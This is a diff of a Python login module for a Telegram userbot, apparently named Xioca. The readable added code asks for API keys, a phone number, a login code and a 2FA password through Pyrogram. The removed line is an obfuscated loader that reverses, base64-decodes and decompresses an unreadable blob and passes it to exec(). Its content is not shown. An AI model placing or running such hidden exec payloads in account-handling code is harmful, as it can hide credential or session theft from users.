@@ -1,1 +1,137 @@
-_ = lambda __ : __import__("zlib").decompress(__import__("base64").b64decode(__[::-1]));exec((_)(b'=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'))
+#    Sh1t-UB (telegram userbot by sh1tn3t)
+#    Copyright (C) 2021-2022 Sh1tN3t
+
+#    This program is free software: you can redistribute it and/or modify
+#    it under the terms of the GNU General Public License as published by
+#    the Free Software Foundation, either version 3 of the License, or
+#    (at your option) any later version.
+
+#    This program is distributed in the hope that it will be useful,
+#    but WITHOUT ANY WARRANTY; without even the implied warranty of
+#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+#    GNU General Public License for more details.
+
+#    You should have received a copy of the GNU General Public License
+#    along with this program.  If not, see <https://www.gnu.org/licenses/>.
+
+import logging
+
+import sys
+import configparser
+
+from datetime import datetime
+from getpass import getpass
+
+from typing import Union, Tuple, NoReturn
+
+from pyrogram import Client, types, errors
+from pyrogram.session.session import Session
+
+from . import __version__
+
+Session.notice_displayed = True
+
+def colored_input(prompt: str = "", hide: bool = False) -> str:
+    """Цветной инпут"""
+    frame = sys._getframe(1)
+    return (input if not hide else getpass)(
+        "\x1b[32m{time:%Y-%m-%d %H:%M:%S}\x1b[0m | "
+        "\x1b[1m{level: <8}\x1b[0m | "
+        "\x1b[36m{name}\x1b[0m:\x1b[36m{function}\x1b[0m:\x1b[36m{line}\x1b[0m - \x1b[1m{prompt}\x1b[0m".format(
+            time=datetime.now(), level="INPUT", name=frame.f_globals["__name__"],
+            function=frame.f_code.co_name, line=frame.f_lineno, prompt=prompt
+        )
+    )
+
+
+class Auth:
+    """Авторизация в аккаунт"""
+
+    def __init__(self, session_name: str = "../xioca") -> None:
+        self._check_api_tokens()
+        self.app = Client(
+            name=session_name,
+            api_id=self.api_id,
+            api_hash=self.api_hash,
+            app_version=f"Xioca {__version__}",
+            device_model="TECNO POVA 5",
+            system_version="Android 14",
+            lang_pack="ru"
+        )
+
+    def _check_api_tokens(self) -> bool:
+        """Проверит установлены ли токены, если нет, то начинает установку"""
+        config = configparser.ConfigParser()
+        if not config.read("./config.ini"):
+            self.api_id = colored_input("Введи API ID: ")
+            self.api_hash = colored_input("Введи API hash: ")
+
+            config["pyrogram"] = {
+                "api_id": self.api_id,
+                "api_hash": self.api_hash
+            }
+
+            with open("./config.ini", "w") as file:
+                config.write(file)
+        else:
+            self.api_id = config["pyrogram"]["api_id"]
+            self.api_hash = config["pyrogram"]["api_hash"]
+
+        return True
+
+    async def send_code(self) -> Tuple[str, str]:
+        """Отправить код подтверждения"""
+        while True:
+            error_text: str = None
+
+            try:
+                phone = colored_input("Введи номер телефона: ")
+                return phone, (await self.app.send_code(phone)).phone_code_hash
+            except errors.PhoneNumberInvalid:
+                error_text = "Неверный номер телефона, попробуй ещё раз"
+            except errors.PhoneNumberBanned:
+                error_text = "Номер телефона заблокирован"
+            except errors.PhoneNumberFlood:
+                error_text = "На номере телефона флудвейт"
+            except errors.PhoneNumberUnoccupied:
+                error_text = "Номер не зарегистрирован"
+            except errors.BadRequest as error:
+                error_text = f"Произошла неизвестная ошибка: {error}"
+
+            if error_text:
+                logging.error(error_text)
+
+    async def enter_code(self, phone: str, phone_code_hash: str) -> Union[types.User, bool]:
+        """Ввести код подтверждения"""
+        try:
+            code = colored_input("Введи код подтверждения: ")
+            return await self.app.sign_in(phone, phone_code_hash, code)
+        except errors.SessionPasswordNeeded:
+            return False
+
+    async def enter_2fa(self) -> types.User:
+        """Ввести код двухфакторной аутентификации"""
+        while True:
+            try:
+                passwd = colored_input("Введи пароль двухфакторной аутентификации: ", True)
+                return await self.app.check_password(passwd)
+            except errors.BadRequest:
+                logging.error("Неверный пароль, попробуй снова")
+
+    async def authorize(self) -> Union[Tuple[types.User, Client], NoReturn]:
+        """Процесс авторизации в аккаунт"""
+        await self.app.connect()
+
+        try:
+            me = await self.app.get_me()
+        except errors.AuthKeyUnregistered:
+            phone, phone_code_hash = await self.send_code()
+            logged = await self.enter_code(phone, phone_code_hash)
+            if not logged:
+                me = await self.enter_2fa()
+        except errors.SessionRevoked:
+            logging.error("Сессия была сброшена, введи rm xioca.session и заново введи команду запуска")
+            await self.app.disconnect()
+            return sys.exit(64)
+
+        return me, self.app
